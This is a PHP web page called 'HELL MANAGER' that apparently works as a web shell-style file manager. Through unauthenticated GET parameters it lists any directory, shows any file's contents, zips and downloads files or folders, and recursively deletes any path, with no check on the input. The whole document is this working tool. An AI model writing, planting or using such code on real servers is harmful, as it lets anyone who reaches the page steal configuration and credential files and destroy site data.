<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title> HELL MANAGER</title>
	<style>
		*{
			outline: none;
			padding: 0;
			margin: 0;
		}
		body{
			display: block;
			width: 100%;
			height: auto;
			background-color: rgba(0, 0, 0, 0.7);
		}
		p{
			display: block;
			width: 100%;
			margin-bottom: 10px;
			border-bottom: 2px solid black;
			position: relative;
		}
		a,.name{
			display: block;
			text-decoration: none;
			padding-left: 15px;
			background-color: black;
			color: white;
			font-weight: 900;
			padding-bottom: 5px;
			padding-top: 5px;
		}
		h1 {
		  font-size: 80px;
		  color: #fff;
		  text-align: center;
		  animation: glow 1s ease-in-out infinite alternate;
		}
		.abs{
			display: flex;
			flex-direction: row nowrap;
			right: 10px;
			position: absolute;
			font-size: 20px;
			font-weight: 900;
			z-index: 1;
			top:0;
			grid-gap: 10px 0;
			height: 100%;
			justify-content: center;
			align-items: center;
			border-left: 2px solid white;
		}
		.abs a{
			transition: .5s;
			color: red;
		}
		.abs .close:hover{
			color: white;
		}
		.abs .down{
			color: white;
		}
		.abs .down:hover{
			color: green;
		}
		.abs .read{
			color: yellow;
		}
		.abs .read:hover{
			color: white;
		}
		.text{
			font-size: 16px;
			background: transparent;
			width: 100%;
			height: 750px;
			color: white;
			border: 0;
		}
		@keyframes glow {
		  from {
		    text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #49eb34, 0 0 40px #49eb34, 0 0 50px #49eb34, 0 0 60px #49eb34, 0 0 70px #49eb34;
		  }
		  
		  to {
		    text-shadow: 0 0 20px #fff, 0 0 30px #71ed61, 0 0 40px #71ed61, 0 0 50px #71ed61, 0 0 60px #71ed61, 0 0 70px #71ed61, 0 0 80px #71ed61;
		  }
		}
	</style>
</head>
<body>
	<h1>HELL MANAGER</h1>
<?php
	function is_dir_empty($dir)
	{
		if (!is_readable($dir)) return NULL; 
		return (count(scandir($dir)) == 2);
	}
	function getDirContents($dir, &$results = array()) {
		if(is_dir_empty($dir))
		{
			return array();
		}else{
		    $files = scandir($dir);
		    foreach ($files as $key => $value) 
		    {
		        $path = str_replace("\\","/",realpath($dir . DIRECTORY_SEPARATOR . str_replace("@eaDir","",str_replace("@SynoEAStream","",str_replace("@eaDir/","",$value)))));
		        if (!is_dir($path)) 
		        {
		            $results[] = $path;
		        } else if ($value != "." && $value != "..") {
		            getDirContents($path, $results);
		            $results[] = $path;
		        }
		    }

		    return $results;
		}
	}
	define('CHUNK_SIZE', 1024*1024); // Size (in bytes) of tiles chunk

	// Read a file and display its content chunk by chunk
	function readfile_chunked($filename, $retbytes = TRUE) {
	    $buffer = '';
	    $cnt    = 0;
	    $handle = fopen($filename, 'rb');

	    if ($handle === false) {
	        return false;
	    }

	    while (!feof($handle)) {
	        $buffer = fread($handle, CHUNK_SIZE);
	        echo $buffer;
	        ob_flush();
	        flush();

	        if ($retbytes) {
	            $cnt += strlen($buffer);
	        }
	    }

	    $status = fclose($handle);

	    if ($retbytes && $status) {
	        return $cnt; // return num. bytes delivered like readfile() does.
	    }

	    return $status;
	}
	function deleteDir($dirPath) {
	    if (!is_dir($dirPath)){
	        unlink($dirPath);
	    }
	    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
	        $dirPath .= '/';
	    }
	    $files = scandir($dirPath); 
	    foreach ($files as $file) {
	        if ($file === '.' || $file === '..') continue;
	        if (is_dir($dirPath.$file)) {
	            deleteDir($dirPath.$file);
	        } else {
	            if ($dirPath.$file !== __FILE__) {
	                unlink($dirPath.$file);
	            }
	        }
	    }
	    rmdir($dirPath);
	}
	function listing($dirpath)
	{
		$dirs=getDirContents($dirpath);
	
		if(count($dirs)>0){
			foreach($dirs as $dir)
			{			
				if(!is_dir($dir))
						print("<p>
							<span class='name'>".$dir."</span>
							<span class='name'>Created: ".date("Y.m.d H:i:s",filectime($dir))."</span>
							<span class='name'>Modified: ".date("Y.m.d H:i:s",filemtime($dir))."</span>
							<span class='abs'>
								<a class='read' href='Hmanager.php?file=".$dir."' target='_blank'>👁</a>
								<a class='down' href='Hmanager.php?download=".$dir."' target='_self'>↓</a>
								<a class='close' onclick='if(!confirm(\"Confirm delete process?\")) return false;' href='login.php?rm=".$dir."'>X</a>
							</span>
							</p>");
						else print("<p>
							<span class='name' style='color: yellow;' >".$dir."</span>
							<span class='name'>Created: ".date("Y.m.d H:i:s",filectime($dir))."</span>
							<span class='name'>Modified: ".date("Y.m.d H:i:s",filemtime($dir))."</span>
							<span class='abs'>
								<a class='down' href='Hmanager.php?dir=".$dir."' target='_blank'>👁</a>
								<a class='down' href='Hmanager.php?download=".$dir."' target='_self'>↓</a>
								<a class='close' onclick='if(!confirm(\"Confirm delete process?\")) return false;' href='Hmanager.php?rm=".$dir."'>X</a>
							</span>
							</p>");
			}
		}
	}

	//default
	$root="./";
	if(count($_GET)==0) listing($root);

	
	if(isset($_GET['dir']))
	{
		if(!empty($_GET['dir']))
		{
		$root=$_GET['dir'];
		}
		listing($root);
	}


	if(isset($_GET['file'])&&!empty($_GET['file']))
	{
		$file=$_GET['file'];
		$line = 1;
		$myfile = fopen($file, "r") or die("Unable to open file!");
		$txt = "";
		while(!feof($myfile)) {
	  		$txt .= $line." ".strval(fgets($myfile));
	  		$line++;
		}
		fclose($myfile);
		print("<textarea class='text'>".$txt."</textarea>");
	}
	if(isset($_GET['download'])&&!empty($_GET['download']))
	{
		$file = $_GET['download'];
		if(!file_exists($file)){
		    die('file not found');
		} else {
			if(!is_dir($file))
			{
				header("Cache-Control: public");
				header("Content-Description: File Transfer");
				header("Content-Disposition: attachment; filename=".basename($file));
				header("Content-Type: application/zip");
				header("Content-Transfer-Encoding: binary");
				header('Content-Length: ' . filesize($file));
				readfile_chunked($file);
			}else{
				$zip = new ZipArchive;
				$filename = dirname($file).".zip";
				if ($zip->open($filename,ZipArchive::CREATE) === TRUE) {
					$files = getDirContents($file);
					foreach($files as $file2){
						$zip->addFile($file2, basename($file2));
					}
				    $zip->close();
				    $zipfile = realpath($filename);
				    header("Cache-Control: public");
					header("Content-Description: File Transfer");
					header("Content-Disposition: attachment; filename=".basename($zipfile));
					header("Content-Type: application/zip");
					header("Content-Transfer-Encoding: binary");
					header('Content-Length: ' . filesize($zipfile));
					readfile_chunked($zipfile);
					unlink($zipfile);
				} else {
				    echo '<script>alert(\''.$zipfile.' not created!\');</script>';
				}
			}
		}
	}
	if(isset($_GET['rm'])&&!empty($_GET['rm']))
	{
		$file = $_GET['rm'];
		$url = "./";
		if (file_exists($file))
		{
			deleteDir($file);
			header("Location: Hmanager.php?dir=".$url);
		}else{
			echo "<script>alert('File not found!');</script>";
		}
	}
?>
</body>
</html>